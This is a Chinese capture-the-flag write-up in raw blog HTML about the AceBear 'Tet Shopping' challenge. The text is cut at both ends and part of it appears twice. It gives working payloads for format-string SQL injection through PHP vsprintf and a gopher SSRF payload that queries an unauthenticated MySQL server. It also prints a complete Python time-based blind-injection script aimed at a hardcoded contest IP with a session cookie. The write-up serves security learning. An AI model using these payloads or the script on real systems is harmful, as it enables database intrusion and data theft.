class=\"line\"></span><br><span class=\"line\">$prepare_qr = $jdb-&gt;addParameter(&quot;SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=%s&quot;,  $_GET[&apos;uid&apos;]);</span><br><span class=\"line\">$prepare_qr = $jdb-&gt;addParameter($prepare_qr.&apos; and user=%s&apos;, $username);</span><br></pre></td></tr></table></figure>\n<p>这里使用了两次addParameter方法，每次调用该方法，都会执行一次vsprintf方法。</p>\n<p>addParamter方法:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function addParameter($qr, $args)&#123;</span><br><span class=\"line\">\t\tif(is_null($qr))&#123;</span><br><span class=\"line\">\t\t\treturn;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tif(strpos($qr, &apos;%&apos;) === false ) &#123;</span><br><span class=\"line\">\t\t\treturn;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t$args = func_get_args();</span><br><span class=\"line\">\t\tarray_shift($args);</span><br><span class=\"line\">\t\tif(is_array($args[0]) &amp;&amp; count($args)==1)&#123;</span><br><span class=\"line\">\t\t\t$args = $args[0];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tforeach($args as $arg)&#123;</span><br><span class=\"line\">\t\t\tif(!is_scalar($arg) &amp;&amp; !is_null($arg))&#123;</span><br><span class=\"line\">\t\t\t\treturn;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t$qr = str_replace( &quot;&apos;%s&apos;&quot;, &apos;%s&apos;, $qr); </span><br><span class=\"line\">\t\t$qr = str_replace( &apos;&quot;%s&quot;&apos;, &apos;%s&apos;, $qr); </span><br><span class=\"line\">\t\t$qr = preg_replace( &apos;|(?&lt;!%)%f|&apos; , &apos;%F&apos;, $qr);</span><br><span class=\"line\">\t\t$qr = preg_replace( &apos;|(?&lt;!%)%s|&apos;, &quot;&apos;%s&apos;&quot;, $qr); </span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tarray_walk($args, array( $this, &apos;ebr&apos; ) );</span><br><span class=\"line\">\t\treturn @vsprintf($qr, $args);</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n<p>测试代码:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    include &apos;cfg.php&apos;;</span><br><span class=\"line\">    # uid = %1$&apos; or 1=1%23</span><br><span class=\"line\">    # </span><br><span class=\"line\">    # username = ht</span><br><span class=\"line\">    $username=$_GET[&apos;username&apos;];</span><br><span class=\"line\">    $prepare_qr = $jdb-&gt;addParameter(&quot;SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=%s&quot;,  $_GET[&apos;uid&apos;]);</span><br><span class=\"line\">    print_r(&quot;First:&lt;br&gt;&quot;);</span><br><span class=\"line\">    print_r($prepare_qr.&apos;&lt;br&gt;&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">    $prepare_qr = $jdb-&gt;addParameter($prepare_qr.&apos; and user=%s&apos;, $username);</span><br><span class=\"line\">    print_r(&quot;Second:&lt;br&gt;&quot;);</span><br><span class=\"line\">    print_r($prepare_qr);</span><br></pre></td></tr></table></figure>\n<p>payload1:</p>\n<blockquote>\n<p><a href=\"http://127.0.0.1/acbear/test_ssql.php?uid=%1\\$&#39;\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1/acbear/test_ssql.php?uid=%1\\$&#39;</a> or 1=1%23&amp;username=ht</p>\n</blockquote>\n<p>结果:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">First:</span><br><span class=\"line\">SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=&apos;%1$\\&apos; or 1=1#&apos;</span><br><span class=\"line\">Second:</span><br><span class=\"line\">SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=&apos;&apos; or 1=1#&apos; and user=&apos;ht&apos;</span><br></pre></td></tr></table></figure>\n<p>payload2:</p>\n<blockquote>\n<p><a href=\"http://127.0.0.1/acbear/test_ssql.php?uid=%1$c\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1/acbear/test_ssql.php?uid=%1$c</a> or 1=1%23&amp;username=39</p>\n</blockquote>\n<p>结果:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">First:</span><br><span class=\"line\">SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=&apos;%1$c or 1=1#&apos;</span><br><span class=\"line\">Second:</span><br><span class=\"line\">SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=&apos;&apos; or 1=1#&apos; and user=&apos;39&apos;</span><br></pre></td></tr></table></figure>\n<h4 id=\"ssrf-gopher\"><a href=\"#ssrf-gopher\" class=\"headerlink\" title=\"ssrf+gopher\"></a>ssrf+gopher</h4><ol>\n<li><p>本地测试gopher协议</p>\n<p>抓包得到如下数据:</p>\n<p>ASCII:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">............!.......................root..mysql_native_password.d._os.Linux._client_name.libmysql._pid.372._client_version.5.7.22\t_platform.x86_64.program_name.mysql!....select @@version_comment limit 1.....SELECT DATABASE().....flag.....show databases.....show tables.....flag......goods......info......users......select * from flag.....</span><br></pre></td></tr></table></figure>\n<p>原始数据:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a100000185a6ff0100000001210000000000000000000000000000000000000000000000726f6f7400006d7973716c5f6e61746976655f70617373776f72640064035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f706964033337320f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c</span><br><span class=\"line\">210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d69742031</span><br><span class=\"line\">120000000353454c4543542044415441424153452829</span><br><span class=\"line\">0500000002666c6167</span><br><span class=\"line\">0f0000000373686f7720646174616261736573</span><br><span class=\"line\">0c0000000373686f77207461626c6573</span><br><span class=\"line\">0600000004666c616700</span><br><span class=\"line\">0700000004676f6f647300</span><br><span class=\"line\">0600000004696e666f00</span><br><span class=\"line\">0700000004757365727300</span><br><span class=\"line\">130000000373656c656374202a2066726f6d20666c6167</span><br><span class=\"line\">0100000001</span><br></pre></td></tr></table></figure>\n<p>将上边的数据合为一行，并使用url编码。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%a1%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%64%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%03%33%37%32%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%12%00%00%00%03%53%45%4c%45%43%54%20%44%41%54%41%42%41%53%45%28%29%05%00%00%00%02%66%6c%61%67%0f%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%0c%00%00%00%03%73%68%6f%77%20%74%61%62%6c%65%73%06%00%00%00%04%66%6c%61%67%00%07%00%00%00%04%67%6f%6f%64%73%00%06%00%00%00%04%69%6e%66%6f%00%07%00%00%00%04%75%73%65%72%73%00%13%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%01%00%00%00%01</span><br></pre></td></tr></table></figure>\n<p>使用gopher协议发送数据。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl gopher://127.0.0.1:3306/_%a1%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%64%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%03%33%37%32%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%12%00%00%00%03%53%45%4c%45%43%54%20%44%41%54%41%42%41%53%45%28%29%05%00%00%00%02%66%6c%61%67%0f%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%0c%00%00%00%03%73%68%6f%77%20%74%61%62%6c%65%73%06%00%00%00%04%66%6c%61%67%00%07%00%00%00%04%67%6f%6f%64%73%00%06%00%00%00%04%69%6e%66%6f%00%07%00%00%00%04%75%73%65%72%73%00%13%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%61%67%01%00%00%00%01</span><br></pre></td></tr></table></figure>\n<p>得到结果:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">J</span><br><span class=\"line\">f☻ §          3cPWM7S♀9^&apos; mysql_native_password   ☻   ☻   ☺  ☺☺&apos;  ☻♥def   ◄@@version_comment ♀! T     ▼  ↔  ♥∟MySQL Community Server (GPL)  ♦  ☻   ☺  ☺☺   ☻♥def</span><br><span class=\"line\">DATABASE() ♀! f     ▼  ☺  ♥  ♦  ☻   ►  ☺   ☻@   ☺♣♦flag☺  ☺☺K  ☻♥def↕information_schemSCHEMATSCHEMATDatabase♂SCHEMA_NAM♀!    ☺    ‼  ♥↕information_schema♦  ♦♥app         bd_study♣  ♠♦blog♂</span><br><span class=\"line\">challenges♠ ♣crawl♦     ♥ctf</span><br><span class=\"line\">graduate_hnis♠  ☼♣hetaomwjs♣</span><br><span class=\"line\">  ►     homestead♠  ◄♣jewe  ↕jiansh  ‼mybatis♠  ¶♣mysql   netclass♠  ■♣nuomi♦  ↨♥o2o‼  ↑↕performance_schema       securixiaomi2chinaz  $♠ydjxpt&quot;  %!yolanda_information_collection_02♠  &amp;♣yshop♠  &apos;♣zhihu  (  &quot;   ☺  ☺☺V  ☻♥def↕information_schema♂TABLE_NAMES♂TABLE_NAMES♫Tables_in_flag</span><br><span class=\"line\">TABLE_NAME♀!    ☺    ♣  ♥♦flag♠  ♦♣goods♣  ♣♦info♠  ♠♣users    &quot;   +  ☺♥def♦flag♦flag♦flag♦flag♦flag♀! ♂         ☻  ☻</span><br><span class=\"line\">,  ☺♥def♦flag♣goods♣goods♥uid♥uid♀? ♂   ♥♥B   ☺0-  ☻♥def♦flag♣goods♣goods♦name♦name♀!    ♣P    ;  ♥♥def♦flag♣goods♣good♂description♂description♀! X☻  ☺►    +  ♦♥def♦flag♣goods♣goods♥img♥img♀! X☻  ☺►      ♣  ☻   (  ☺♥def♦flag♦info♦info☻id☻i♀? ♂   ♥♥B   ☺0+  ☻♥def♦flag♦info♦info♦user♦user♀! ,☺  ☺►    *  ♥♥def♦flag♦info♦info♥gid♥gid♀? ♂   ♥☺►   ☺0  ♦  ☻   ,  ☺♥def♦flag♣users♣users♥uid♥uid♀? ♂   ♥♥B   ☺0-  ☻♥def♦flag♣users♣users♦user♦user♀!    ♣P    1  ♥♥def♦flag♣users♣users♠passwd♠passwd♀!    ☺►      ♦  ☻   ☺  ☺☺*  ☻♥def♦flag♦flag♦flag♦flag♦flag♀! ♂          ♥▼CTF&#123;SSRF_GOPHER_CAN_YOU_GOT_IT&#125;  ♦</span><br></pre></td></tr></table></figure>\n<p>虽然有些乱码，我们可以看到，查询的flag出现了。    </p>\n</li>\n<li><p>修改sql语句。</p>\n<blockquote>\n<p>130000000373656c656374202a2066726f6d20666c6167</p>\n</blockquote>\n<p>原始数据中，改行即对应着sql语句，结构如下:</p>\n<blockquote>\n<p>hex(sql语句长度加1) + 固定字段(00000003 ) + sql语句16进制编码</p>\n</blockquote>\n<p>修改该行，即可获得执行对应的sql语句。</p>\n</li>\n</ol>\n<h3 id=\"利用脚本\"><a href=\"#利用脚本\" class=\"headerlink\" title=\"利用脚本\"></a>利用脚本</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">str_hex</span><span class=\"params\">(data)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> str(hex(data)).replace(<span class=\"string\">'0x'</span>,<span class=\"string\">''</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">encode</span><span class=\"params\">(query)</span>:</span></span><br><span class=\"line\">    enc_query = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> query:</span><br><span class=\"line\">        enc_query += str_hex(ord(i))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> enc_query</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">gen_payload</span><span class=\"params\">(query)</span>:</span></span><br><span class=\"line\">    payload = <span class=\"string\">'a100000185a6ff0100000001210000000000000000000000000000000000000000000000726f6f7400006d7973716c5f6e61746976655f70617373776f72640064035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f706964033337320f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d69742031120000000353454c45435420444154414241534528290500000002666c61670f0000000373686f77206461746162617365730c0000000373686f77207461626c65730600000004666c6167000700000004676f6f6473000600000004696e666f000700000004757365727300'</span></span><br><span class=\"line\">    payload += str_hex(len(query)+<span class=\"number\">1</span>)</span><br><span class=\"line\">    payload += <span class=\"string\">'00000003'</span></span><br><span class=\"line\">    payload += encode(query)</span><br><span class=\"line\">    payload += <span class=\"string\">'0100000001'</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">result</span><span class=\"params\">(payload)</span>:</span></span><br><span class=\"line\">    result = [payload[i:i+<span class=\"number\">2</span>] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,len(payload),<span class=\"number\">2</span>)]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> binascii.b2a_hex(<span class=\"string\">b\"gopher://127.0.0.1:3306/_%\"</span>+<span class=\"string\">\"%\"</span>.join(result))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">exp</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    i = <span class=\"number\">1</span></span><br><span class=\"line\">    flag = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    url = <span class=\"string\">\"http://128.199.179.156/info.php\"</span></span><br><span class=\"line\">    cookie = &#123;</span><br><span class=\"line\">        <span class=\"string\">'PHPSESSID'</span>:<span class=\"string\">'av7963h17c1qukv4jm4gklvoi1'</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"keyword\">True</span>:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">127</span>,<span class=\"number\">32</span>,<span class=\"number\">-1</span>):</span><br><span class=\"line\">            <span class=\"keyword\">print</span> <span class=\"string\">'j:'</span>+str(j)</span><br><span class=\"line\">            query = <span class=\"string\">\"select * from flag.flag where IF(ascii(substr((select * from flag.flag),%s,1)) =%s,sleep(5),1);\"</span> % (str(i),str(j))</span><br><span class=\"line\">            uid = <span class=\"string\">\"?uid=%1$'%20union%20select%201,1,0x\"</span> + result(gen_payload(query)) + <span class=\"string\">\"%23\"</span></span><br><span class=\"line\">            fullurl = url + uid</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                r = requests.get(fullurl,cookies=cookie,timeout=<span class=\"number\">5</span>)</span><br><span class=\"line\">            <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                flag += chr(j)</span><br><span class=\"line\">                print(flag)</span><br><span class=\"line\">                i = i+<span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">    print(flag)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    exp()</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"AceBear-Security-Contest-Tet-Shopping\"><a href=\"#AceBear-Security-Contest-Tet-Shopping\" class=\"headerlink\" title=\"AceBear Security  Contest-Tet Shopping\"></a>AceBear Security  Contest-Tet Shopping</h2><h3 id=\"漏洞说明\"><a href=\"#漏洞说明\" class=\"headerlink\" title=\"漏洞说明\"></a>漏洞说明</h3><ul>\n<li>格式化字符串sql注入</li>\n<li>基于gopher协议的SSRF攻击完成对mysql未授权漏洞的利用</li>\n<li>时间盲注</li>\n</ul>\n<h3 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h3><h4 id=\"格式化字符串注入忽略\"><a href=\"#格式化字符串注入忽略\" class=\"headerlink\" title=\"格式化字符串注入忽略\"></a>格式化字符串注入忽略</h4><p>漏洞代码:</p>\n<p>info.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uid = (int)$_SESSION[&quot;id&quot;];</span><br><span class=\"line\">$prepare_qr = $jdb-&gt;addParameter(&quot;SELECT user from users where uid=%s&quot;, $uid);</span><br><span class=\"line\">$result1 = $jdb-&gt;fetch_assoc($prepare_qr);</span><br><span class=\"line\">$username = $result1[0][&apos;user&apos;];</span><br><span class=\"line\"></span><br><span class=\"line\">$prepare_qr = $jdb-&gt;addParameter(&quot;SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=%s&quot;,  $_GET[&apos;uid&apos;]);</span><br><span class=\"line\">$prepare_qr = $jdb-&gt;addParameter($prepare_qr.&apos; and user=%s&apos;, $username);</span><br></pre></td></tr></table></figure>\n<p>这里使用了两次addParameter方法，每次调用该方法，都会执行一次vsprintf方法。</p>\n<p>addParamter方法:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function addParameter($qr, $args)&#123;</span><br><span class=\"line\">\t\tif(is_null($qr))&#123;</span><br><span class=\"line\">\t\t\treturn;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tif(strpos($qr, &apos;%&apos;) === false ) &#123;</span><br><span class=\"line\">\t\t\treturn;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t$args = func_get_args();</span><br><span class=\"line\">\t\tarray_shift($args);</span><br><span class=\"line\">\t\tif(is_array($args[0]) &amp;&amp; count($args)==1)&#123;</span><br><span class=\"line\">\t\t\t$args = $args[0];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tforeach($args as $arg)&#123;</span><br><span class=\"line\">\t\t\tif(!is_scalar($arg) &amp;&amp; !is_null($arg))&#123;</span><br><span class=\"line\">\t\t\t\treturn;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t$qr = str_replace( &quot;&apos;%s&apos;&quot;, &apos;%s&apos;, $qr); </span><br><span class=\"line\">\t\t$qr = str_replace( &apos;&quot;%s&quot;&apos;, &apos;%s&apos;, $qr); </span><br><span class=\"line\">\t\t$qr = preg_replace( &apos;|(?&lt;!%)%f|&apos; , &apos;%F&apos;, $qr);</span><br><span class=\"line\">\t\t$qr = preg_replace( &apos;|(?&lt;!%)%s|&apos;, &quot;&apos;%s&apos;&quot;, $qr); </span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tarray_walk($args, array( $this, &apos;ebr&apos; ) );</span><br><span class=\"line\">\t\treturn @vsprintf($qr, $args);</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n<p>测试代码:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    include &apos;cfg.php&apos;;</span><br><span class=\"line\">    # uid = %1$&apos; or 1=1%23</span><br><span class=\"line\">    # </span><br><span class=\"line\">    # username = ht</span><br><span class=\"line\">    $username=$_GET[&apos;username&apos;];</span><br><span class=\"line\">    $prepare_qr = $jdb-&gt;addParameter(&quot;SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=%s&quot;,  $_GET[&apos;uid&apos;]);</span><br><span class=\"line\">    print_r(&quot;First:&lt;br&gt;&quot;);</span><br><span class=\"line\">    print_r($prepare_qr.&apos;&lt;br&gt;&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">    $prepare_qr = $jdb-&gt;addParameter($prepare_qr.&apos; and user=%s&apos;, $username);</span><br><span class=\"line\">    print_r(&quot;Second:&lt;br&gt;&quot;);</span><br><span class=\"line\">    print_r($prepare_qr);</span><br></pre></td></tr></table></figure>\n<p>payload1:</p>\n<blockquote>\n<p><a href=\"http://127.0.0.1/acbear/test_ssql.php?uid=%1\\$&#39;\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1/acbear/test_ssql.php?uid=%1\\$&#39;</a> or 1=1%23&amp;username=ht</p>\n</blockquote>\n<p>结果:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">First:</span><br><span class=\"line\">SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=&apos;%1$\\&apos; or 1=1#&apos;</span><br><span class=\"line\">Second:</span><br><span class=\"line\">SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=&apos;&apos; or 1=1#&apos; and user=&apos;ht&apos;</span><br></pre></td></tr></table></figure>\n<p>payload2:</p>\n<blockquote>\n<p><a href=\"http://127.0.0.1/acbear/test_ssql.php?uid=%1$c\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1/acbear/test_ssql.php?uid=%1$c</a> or 1=1%23&amp;username=39</p>\n</blockquote>\n<p>结果:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">First:</span><br><span class=\"line\">SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=&apos;%1$c or 1=1#&apos;</span><br><span class=\"line\">Second:</span><br><span class=\"line\">SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=&apos;&apos; or 1=1#&apos; and user=&apos;39&apos;</span><br></pre></td></tr></table></figure>\n<h4 id=\"ssrf-gopher\"><a href=\"#ssrf-gopher\" class=\"headerlink\" title=\"ssrf+gopher\"></a>ssrf+gopher</h4><ol>\n<li><p>本地测试gopher协议</p>\n<p>抓包得到如下数据:</p>\n<p>ASCII:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">............!.......................root..mysql_native_password.d._os.Linux._client_name.libmysql._pid.372._client_version.5.7.22\t_platform.x86_64.program_name.mysql!....select @@version_comment limit 1.....SELECT DATABASE().....flag.....show databases.....show tables.....flag......goods......info......users......select * from flag.....</span><br></pre></td></tr></table></figure>\n<p>原始数据:</p>\n<figure class=\"highlight plain\"><table><tr><td 